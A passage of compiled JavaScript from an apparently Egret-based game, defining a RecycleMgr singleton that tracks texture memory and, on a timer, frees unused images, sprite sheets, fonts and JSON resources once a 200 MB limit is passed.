    __extends(RecycleMgr, _super);
    function RecycleMgr() {
        var _this = _super.call(this) || this;
        _this.isFirstEnter = true;
        _this.resDisTime = {};
        _this.imageTotalSize = 0;
        _this.images = [];
        _this.jsons = [];
        _this.sheets = [];
        _this.fonts = [];
        return _this;
    }
    RecycleMgr_1 = RecycleMgr;
    RecycleMgr.ins = function () {
        return _super.ins.call(this);
    };
    RecycleMgr.prototype.addImage = function (key, value) {
        if (RecycleMgr_1.ins().images[key]) {
            console.error("资源重复:", key);
        }
        RecycleMgr_1.ins().images[key] = value;
        var texture = value.texture;
        var size = 0;
        if (texture instanceof egret.Texture) {
            size = texture.$bitmapWidth * texture.$bitmapHeight * 4;
            this.imageTotalSize += size;
            var hashCode = this.getTextureHashCode(texture);
            if (hashCode) {
                if (this.resDisTime[hashCode]) {
                    delete this.resDisTime[hashCode];
                }
            }
        }
    };
    RecycleMgr.prototype.delImage = function (key) {
        var value = RecycleMgr_1.ins().images[key];
        if (!value) {
            console.error("资源不存在:", key);
            return;
        }
        delete RecycleMgr_1.ins().images[key];
        var texture = value.texture;
        var size = 0;
        if (texture instanceof egret.Texture) {
            size = texture.$bitmapWidth * texture.$bitmapHeight * 4;
            this.imageTotalSize -= size;
        }
    };
    RecycleMgr.prototype.start = function () {
        var _this = this;
        TimerMgr.ins().doTimer(5000, 0, function () {
            _this.destroy();
        }, this);
    };
    RecycleMgr.prototype.destroy = function () {
        if (this.isFirstEnter) {
            this.isFirstEnter = false;
            this.start();
        }
        else {
            this.destroyRes();
        }
    };
    RecycleMgr.prototype.destroyWin = function () {
    };
    RecycleMgr.prototype.disposeResTime = function (hashCode) {
        this.resDisTime[hashCode] = egret.getTimer();
    };
    RecycleMgr.prototype.destroyRes = function () {
        var disArr = [];
        for (var hashCode in this.resDisTime) {
            var disTime = this.resDisTime[hashCode];
            disArr.push({ code: hashCode, disTime: disTime });
        }
        disArr.sort((function (a, b) {
            return a.disTime - b.disTime;
        }));
        var codeMap = {};
        for (var key in this.images) {
            var value = this.images[key];
            if (value.texture && value.resource) {
                var hashCode = this.getTextureHashCode(value.texture);
                codeMap[hashCode] = value;
            }
            else {
                delete this.images[key];
            }
        }
        for (var i = 0; i < disArr.length; i++) {
            var disData = disArr[i];
            var value = codeMap[disData.code];
            if (!value) {
                delete this.resDisTime[disData.code];
                continue;
            }
            if (value.resource.url.indexOf(PATH_PUBLIC) >= 0 || value.resource.url.indexOf(PATH_MAP) >= 0) {
                continue;
            }
            if (this.imageTotalSize < RecycleMgr_1.MaxImageSize) {
                break;
            }
            var key = value.resource.name;
            if (this.checkCanDestroy(disData.code)) {
                if (this.sheets[key]) {
                    if (RES.hasRes(this.sheets[key])) {
                        RES.destroyRes(this.sheets[key]);
                    }
                    delete this.sheets[key];
                }
                else if (this.fonts[key]) {
                    if (RES.hasRes(this.fonts[key])) {
                        RES.destroyRes(this.fonts[key]);
                    }
                    delete this.fonts[key];
                }
                else {
                    this.destoryMc(key);
                }
            }
        }
    };
    RecycleMgr.prototype.checkCanDestroy = function (hashCode) {
        var imageArr = egret.BitmapData['_displayList'][hashCode];
        var mcArr = GameMovieClip.displayList[hashCode];
        if (imageArr && imageArr.length || mcArr && mcArr.length) {
            if (this.resDisTime[hashCode]) {
                delete this.resDisTime[hashCode];
            }
        }
        else {
            if (!this.resDisTime[hashCode]) {
                return true;
            }
            delete egret.BitmapData['_displayList'][hashCode];
            delete GameMovieClip.displayList[hashCode];
            delete GameMovieClip.factoryDic[hashCode];
            delete this.resDisTime[hashCode];
            return true;
        }
        return false;
    };
    RecycleMgr.prototype.destroyMapFile = function (fileDic) {
    };
    RecycleMgr.prototype.destoryMc = function (key) {
        if (RES.hasRes(key)) {
            RES.destroyRes(key);
        }
        else {
            delete this.images[key];
        }
        this.destoryJson(key);
    };
    RecycleMgr.prototype.destoryJson = function (key) {
        var jsonKey = key.replace(".png", ".json");
        if (this.jsons[jsonKey]) {
            if (RES.hasRes(jsonKey)) {
                RES.destroyRes(jsonKey);
            }
            else {
                delete this.jsons[jsonKey];
            }
        }
    };
    RecycleMgr.prototype.getTextureHashCode = function (texture) {
        var hashCode = texture.hashCode;
        if (texture.bitmapData && texture.bitmapData.hashCode) {
            hashCode = texture.bitmapData.hashCode;
        }
        return hashCode;
    };
    RecycleMgr.prototype.reloadContainer = function (obj, reloadMc) {
        if (reloadMc === void 0) { reloadMc = false; }
        var num = obj.numChildren;
        for (var i = 0; i < num; i++) {
            var img = obj.getChildAt(i);
            if (img instanceof eui.Image) {
                this.reloadImg(img);
            }
            else if (reloadMc && img instanceof GameMovieClip) {
                if (img.name && -1 == img.playCount) {
                    img.playFile(img.name, img.playCount);
                }
            }
            else if (img instanceof egret.DisplayObjectContainer) {
                this.reloadContainer(img, reloadMc);
            }
        }
    };
    RecycleMgr.prototype.reloadImg = function (image) {
        if (image) {
            var source = image.source;
            if (source) {
                if (image.texture && image.texture.bitmapData) {
                    return;
                }
                image.source = null;
                image.source = source;
            }
        }
    };
    RecycleMgr.prototype.fontGetTexturePath = function (url, fntText) {
        var file = "";
        var lines = fntText.split("\n");
        var pngLine = lines[2];
        var index = pngLine.indexOf("file=\"");
        if (index != -1) {
            pngLine = pngLine.substring(index + 6);
            index = pngLine.indexOf("\"");
            file = pngLine.substring(0, index);
        }
        url = url.split("\\").join("/");
        index = url.lastIndexOf("/");
        if (index != -1) {
            url = url.substring(0, index + 1) + file;
        }
        else {
            url = file;
        }
        return url;
    };
    RecycleMgr.MaxImageSize = 200 * 1024 * 1024;
    __decorate([
        callLater
    ], RecycleMgr.prototype, "destroyRes", null);
    RecycleMgr = RecycleMgr_1 = __decorate([
        recycle
    ], RecycleMgr);
    return RecycleMgr;
    var RecycleMgr_1;
}(SingleClass));
__reflect(RecycleMgr.prototype, "RecycleMgr");
